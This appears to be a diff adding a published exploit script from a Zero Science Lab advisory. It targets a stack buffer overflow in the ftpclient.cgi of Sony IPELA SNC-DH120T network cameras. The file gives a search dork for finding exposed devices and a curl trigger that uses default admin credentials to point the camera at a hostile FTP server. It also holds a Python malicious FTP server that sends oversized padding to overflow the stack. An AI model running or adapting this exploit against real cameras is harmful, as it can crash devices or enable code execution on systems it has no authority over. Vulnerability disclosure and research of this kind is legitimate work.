@@ -1,0 +1,91 @@
+# Exploit Title: Sony IPELA Network Camera 1.82.01 - 'ftpclient.cgi' Remote Stack Buffer Overflow
+# Google Dork: Server: Mida eFramework
+# Date: 2020-09-30
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://pro.sony
+# Version: <= 1.82.01
+
+#!/usr/bin/env python
+#
+#
+# Sony IPELA Network Camera (ftpclient.cgi) Remote Stack Buffer Overflow
+#
+#
+# Vendor: Sony Electronics Inc.
+# Product web page: https://pro.sony
+# Affected version: SNC-DH120T v1.82.01
+#
+#
+# Summary: IPELA is Sony's vision of the ultimate workplace, designed to revolutionize
+# the way business communicates over global IP networks. IPELA products can improve the
+# efficiency of your organization by connecting people and places with high-quality audio
+# and video. The SNC-DH120T is an indoor tamper proof, high definition (720p) minidome
+# network security camera with Electronic Day/Night settings, DEPA analysis and is ONVIF
+# compliant. It supports dual streaming of H.264, MPEG-4 and JPEG at full frame-rate.
+#
+# Desc: The vulnerability is caused due to a boundary error in the processing of received
+# FTP traffic through the FTP client functionality (ftpclient.cgi), which can be exploited
+# to cause a stack-based buffer overflow when a user issues a POST request to connect to a
+# malicious FTP server. Successful exploitation could allow execution of arbitrary code on
+# the affected device or cause denial of service scenario.
+#
+# Tested on: gen5th/1.x
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2020-5596
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5596.php
+# Fixed in 1.88.0.0: https://pro.sony/en_NL/support-resources/snc-dh120/software/mpengb00000928
+#
+#
+# 28.10.2019
+# 
+
+
+# PoC:
+
+# Trigger:
+# curl 'http://10.0.0.3:5080/command/ftpclient.cgi' \
+#   -H 'Connection: keep-alive' \
+#   -H 'Cache-Control: max-age=0' \
+#   -H 'Authorization: Basic YWRtaW46YWRtaW4=' \
+#   -H 'Upgrade-Insecure-Requests: 1' \
+#   -H 'Origin: http://10.0.0.3:5080' \
+#   -H 'Content-Type: application/x-www-form-urlencoded' \
+#   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36' \
+#   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
+#   -H 'Referer: http://81.83.17.200:5080/en/l4/ftp/common.html' \
+#   -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
+#   --data 'FtpClientFunc=on&FcServerName=10.0.0.5&FcUserName=EVIL&FcPassword=NONESO&FcPassive=off&reload=referer' \
+#   --compressed \
+#   --insecure
+#
+#
+
+# Observed fixed version log:
+# 2020-07-27 17:48:03 FTP client Unexpected error occurred during FTP client operation.
+#
+
+
+import socket
+
+HOST = '127.0.0.1' # 10.0.0.5
+PORT = 21
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(1)
+conn, addr = s.accept()
+print 'Connection from', addr
+while True:
+    data = conn.recv(1024)
+    if not data:
+        break
+    evil  = "A" * 100000
+    evil += "B" * 10000
+    evil += "C" * 1000
+    conn.sendall(evil+'\n')
+    s.close()
